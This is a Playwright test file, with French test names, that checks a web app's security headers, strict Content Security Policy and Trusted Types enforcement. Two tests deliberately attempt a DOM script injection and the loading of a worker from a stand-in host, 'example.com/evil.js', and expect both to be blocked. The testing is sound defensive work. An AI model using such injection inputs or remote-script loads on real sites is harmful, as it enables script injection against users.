import { expect, test } from '@playwright/test';
import { buildHeaders } from '../../../security/headers.mjs';
import { watchViolations } from './helpers';

test('les en-têtes de sécurité sont présents (T2.8)', async ({ request }) => {
  const expected = buildHeaders({ upgradeInsecure: false }) as Record<string, string>;
  for (const path of ['/', '/index.html']) {
    const res = await request.get(path);
    for (const [name, value] of Object.entries(expected)) {
      expect(res.headers()[name.toLowerCase()], `${name} sur ${path}`).toBe(value);
    }
  }
});

test('la CSP respecte le PLAN T2.6', async ({ request }) => {
  const csp = (await request.get('/')).headers()['content-security-policy'] ?? '';
  for (const d of [
    "default-src 'none'",
    "script-src 'self'",
    "style-src 'self'",
    "connect-src 'self'",
    "worker-src 'self' blob:",
    "base-uri 'none'",
    "form-action 'none'",
    "frame-ancestors 'none'",
    "object-src 'none'",
    "require-trusted-types-for 'script'",
  ]) {
    expect(csp).toContain(d);
  }
  expect(csp).not.toMatch(/unsafe-inline|unsafe-eval|https?:\/\/|\*/);
});

test('aucun style, script ni gestionnaire inline dans la page livrée', async ({ request }) => {
  const html = await (await request.get('/')).text();
  expect(html).not.toMatch(/<style[\s>]/i);
  expect(html).not.toMatch(/<script(?![^>]*\ssrc=)[^>]*>/i);
  expect(html).not.toMatch(/\son[a-z]+=/i);
});

test('aucune violation CSP ni Trusted Types au chargement et en navigation', async ({ page }) => {
  const violations = watchViolations(page);
  await page.goto('/');
  await page.getByRole('button', { name: 'J’ai mon fichier' }).click();
  await page.getByRole('button', { name: 'Retour' }).click();
  await expect(page.getByRole('heading', { name: /Récupérer ton export Garmin/ })).toBeVisible();
  expect(violations).toEqual([]);
});

test('une injection de script par DOM est bloquée par Trusted Types', async ({
  page,
  browserName,
}) => {
  test.skip(browserName !== 'chromium', 'Trusted Types : Chromium uniquement ici');
  await page.goto('/');
  const result = await page.evaluate(() => {
    try {
      // Tentative volontaire : on prouve que Trusted Types la bloque.
      // eslint-disable-next-line no-restricted-properties
      document.body.innerHTML = '<img src=x>';
      return 'allowed';
    } catch (e) {
      return (e as Error).name;
    }
  });
  expect(result).toBe('TypeError');
});

test('un worker d’une autre origine est refusé par la politique', async ({ page, browserName }) => {
  test.skip(browserName !== 'chromium', 'Trusted Types : Chromium uniquement ici');
  await page.goto('/');
  const result = await page.evaluate(() => {
    try {
      new Worker('https://example.com/evil.js');
      return 'allowed';
    } catch (e) {
      return (e as Error).name;
    }
  });
  expect(result).toBe('TypeError');
});
